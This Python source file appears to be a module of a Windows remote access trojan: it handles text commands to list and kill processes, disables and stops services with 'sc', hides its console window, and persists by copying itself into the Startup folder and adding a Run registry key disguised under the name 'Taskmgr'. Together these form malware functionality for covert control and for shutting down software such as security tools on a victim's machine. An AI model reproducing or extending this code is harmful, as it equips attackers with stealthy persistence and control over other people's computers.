import shutil
import subprocess
import win32console
import win32gui
import psutil
from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, OpenKey, SetValueEx

def kill_process_cmd(message):
    try:
        pid = message.split(" ")[1]
        return kill_process(pid)
    except Exception as e:
        return f"Error: {e}"
    
def kill_process(pid):
    try:
        pid = str(pid)
        subprocess.run(['taskkill', '/F', '/PID', pid], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return f"Succesfully killed process: {pid}"
    except subprocess.CalledProcessError as e:
        return f"Called Process Error: {e}"
    except Exception as e:
        return f"Error: {e}"
    
def get_all_pids_by_name(name):
    try:
        pids = []
        name = name.lower()
        for proc in psutil.process_iter(['pid', 'name']):
            if name in proc.info['name'].lower():
                pids.append(proc.info['pid'])
        return pids
    except Exception:
        return None
    
def kill_all_processes_by_name(message):
    try:
        name = message.split(" ")[1]
        pids = get_all_pids_by_name(name)
        for pid in pids: kill_process(pid)
    except Exception as e:
        return f"Error: {e}"

def processes(message):
    split = message.split(" ")
    params = len(split) == 2
    finalstr = ""
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if not params or (params and split[1].lower() in proc.info['name'].lower()):
                finalstr += f"PID: {proc.info['pid']}, Name: {proc.info['name']}\n"
    except Exception as e: return e
    return finalstr

def get_all_services():
    try: return list(psutil.win_service_iter())
    except: return None

def stop_service(service_name):
    try:
        subprocess.run(['sc', 'config', service_name, "start=", "disabled"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        subprocess.run(['sc', 'stop', service_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return f"Succesfully stopped service: {service_name}"
    except subprocess.CalledProcessError as e:
        return f"Called Process Error: {e}"
    except Exception as e:
        return f"Error: {e}"
    
def stop_service_cmd(message):
    try:
        service_name = message.split(" ")[1]
        return stop_service(service_name)
    except Exception as e: return f"Error: {e}"

def get_all_services_cmd(message):
    try:
        running = False
        if len(message.split(" ")) > 1: running = True

        services = get_all_services()
        final = ""
        for s in services:
            if (running and s.status() == "running") or not running:
                final += f"Name: {s.name()}, DisplayName: {s.display_name()}, Status: {s.status()}\n"
        return final
    except Exception as e:
        return f"Error: {e}"

def add_to_startup_1():
    response = "Add to startup failed"
    try:
        shutil.copy(__file__, f"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
        return "Add to startup folder Success"
    except Exception as e: return f"Error: {e}"

def add_to_startup_2():
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
    try:
        SetValueEx(key2change, "Taskmgr", 0, REG_SZ, __file__)
    except Exception as e: return f"Error occured: {e}"
    return "Successfully added startup regkey"

def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
